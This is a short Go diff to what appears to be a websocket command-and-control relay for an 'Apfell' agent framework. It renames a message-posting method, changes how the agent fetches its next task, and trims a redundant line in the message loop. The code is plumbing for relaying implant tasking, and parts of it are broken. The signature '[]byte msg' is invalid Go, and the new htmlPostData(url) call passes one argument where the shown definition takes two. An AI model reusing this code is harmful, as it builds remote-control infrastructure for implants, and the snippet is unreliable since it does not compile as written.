@@ -67,7 +67,7 @@ func (s *WebsocketC2) SetSocketURI(uri string) {
 	s.SocketURI = uri
 }
 
-func (s *WebsocketC2) postMessage([]byte msg) []byte {
+func (s *WebsocketC2) PostMessage([]byte msg) []byte {
 	urlEnding := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
 	return s.htmlPostData(urlEnding, msg)
 }
@@ -75,7 +75,7 @@ func (s *WebsocketC2) postMessage([]byte msg) []byte {
 func (s WebsocketC2) GetNextTask(apfellID string) []byte {
 	//place holder
 	url := fmt.Sprintf("%sapi/v%s/agent_message", s.ApfellBaseURL(), ApiVersion)
-	return s.htmlGetData(url)
+	return s.htmlPostData(url)
 }
 
 func (s WebsocketC2) PostResponse(taskid string, output []byte) []byte {
@@ -224,12 +224,11 @@ LOOP:
 		var resp []byte
 		if m.Client {
 			s.Websocketlog(fmt.Sprintf("Received agent message %+v\n", m))
-			resp = s.postMessage([]byte(m.Data))
+			resp = s.PostMessage([]byte(m.Data))
 		}
 		
 
 		reply := Message{Client: false}
-		reply.Client = false
 
 		if len(resp) == 0 {
 			reply.Data = string(make([]byte, 1))
